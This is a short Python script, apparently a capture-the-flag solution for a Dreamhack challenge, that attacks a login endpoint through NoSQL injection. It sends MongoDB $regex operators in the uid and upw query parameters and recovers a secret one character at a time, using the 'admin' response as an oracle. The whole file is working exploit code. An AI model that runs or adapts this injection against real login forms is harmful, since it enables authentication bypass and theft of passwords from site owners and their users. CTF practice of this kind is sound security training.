import requests, string
from tqdm import *

HOST = 'http://host3.dreamhack.games:22541'
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'

flag = ''
for i in tqdm(range(32)):
    for ch in ALPHANUMERIC:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        if response.text == SUCCESS:
            flag += ch
            break
    print(f'FLAG: DH{{{flag}}}')